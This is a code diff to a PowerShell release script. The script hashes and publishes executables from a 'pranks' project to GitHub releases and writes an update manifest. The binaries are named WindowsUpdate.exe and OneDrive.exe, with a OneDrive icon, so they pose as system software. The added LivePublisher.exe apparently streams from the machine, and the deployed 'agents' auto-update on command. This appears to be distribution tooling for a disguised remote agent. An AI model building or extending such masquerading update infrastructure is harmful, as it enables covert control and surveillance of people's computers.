@@ -27,6 +27,7 @@ $ErrorActionPreference = "Stop"
 $agentSource         = "C:\Users\mohba\OneDrive\Desktop\pranks\Agent\Source"
 $primaryExe          = Join-Path $agentSource "publish_out\WindowsUpdate.exe"
 $shadowExe           = Join-Path $agentSource "publish_out_shadow\OneDrive.exe"
+$livePublisherExe    = "C:\Users\mohba\OneDrive\Desktop\pranks\livestream\LivePublisher.exe"
 $manifestDir         = $PSScriptRoot
 $manifestPath        = Join-Path $manifestDir "manifest.json"
 $iconDest            = Join-Path $agentSource "Assets\OneDrive.ico"
@@ -154,6 +155,10 @@ if (-not $SkipBuild) {
 
 if (-not (Test-Path $primaryExe)) { Fail "primary exe not found: $primaryExe" }
 if (-not (Test-Path $shadowExe))  { Fail "shadow exe not found: $shadowExe" }
+$havePublisher = Test-Path $livePublisherExe
+if (-not $havePublisher) {
+    Write-Host "[WARN] LivePublisher.exe nicht gefunden ($livePublisherExe) - manifest wird ohne livePublisher-Felder gebaut." -ForegroundColor Yellow
+}
 
 # ---------------- 3) SHA-256 + size (both exes) ----------------
 Write-Host "[HASH]  Computing SHA-256..." -ForegroundColor Cyan
@@ -165,19 +170,33 @@ $primaryMb = [math]::Round($primarySize/1MB, 1)
 $shadowMb  = [math]::Round($shadowSize/1MB, 1)
 Write-Host ("        primary sha256 = {0}  ({1} MB)" -f $primaryHash, $primaryMb)
 Write-Host ("        shadow  sha256 = {0}  ({1} MB)" -f $shadowHash,  $shadowMb)
+$livePublisherHash = $null
+$livePublisherSize = 0
+if ($havePublisher) {
+    $livePublisherHash = Compute-Sha256 -Path $livePublisherExe
+    $livePublisherSize = (Get-Item $livePublisherExe).Length
+    $lpMb = [math]::Round($livePublisherSize/1MB, 1)
+    Write-Host ("        livePub sha256 = {0}  ({1} MB)" -f $livePublisherHash, $lpMb)
+}
 
 # ---------------- 4) Update manifest.json ----------------
 Write-Host "[MANI] Updating manifest.json..." -ForegroundColor Cyan
 $primaryUrl = "https://github.com/$ghOwner/$ghRepo/releases/download/v$Version/WindowsUpdate.exe"
 $shadowUrl  = "https://github.com/$ghOwner/$ghRepo/releases/download/v$Version/OneDrive.exe"
-$manifest = [ordered]@{
+$livePublisherUrl = "https://github.com/$ghOwner/$ghRepo/releases/download/v$Version/LivePublisher.exe"
+$manifestObj = [ordered]@{
     version      = $Version
     sha256       = $primaryHash
     url          = $primaryUrl
     shadowSha256 = $shadowHash
     shadowUrl    = $shadowUrl
-    notes        = $Notes
-} | ConvertTo-Json -Depth 4
+}
+if ($havePublisher) {
+    $manifestObj.livePublisherSha256 = $livePublisherHash
+    $manifestObj.livePublisherUrl    = $livePublisherUrl
+}
+$manifestObj.notes = $Notes
+$manifest = $manifestObj | ConvertTo-Json -Depth 4
 Set-Content -Path $manifestPath -Value $manifest -Encoding utf8
 Write-Host "       -> $manifestPath"
 
@@ -206,9 +225,11 @@ if ($SkipUpload) {
     exit 0
 }
 
-Write-Host "[REL]  GitHub Release v$Version + 2 asset uploads via gh CLI..." -ForegroundColor Cyan
+Write-Host "[REL]  GitHub Release v$Version + asset uploads via gh CLI..." -ForegroundColor Cyan
 $notesArg = if ([string]::IsNullOrWhiteSpace($Notes)) { "Release v$Version" } else { $Notes }
-gh release create "v$Version" $primaryExe $shadowExe --title "v$Version" --notes $notesArg
+$assets = @($primaryExe, $shadowExe)
+if ($havePublisher) { $assets += $livePublisherExe }
+gh release create "v$Version" @assets --title "v$Version" --notes $notesArg
 if ($LASTEXITCODE -ne 0) { Fail "gh release create failed" }
 Write-Host "[OK]   Release v$Version live" -ForegroundColor Green
 Write-Host "       Agents pull within autoUpdateIntervalMinutes. Trigger now: /checkupdate force" -ForegroundColor Green
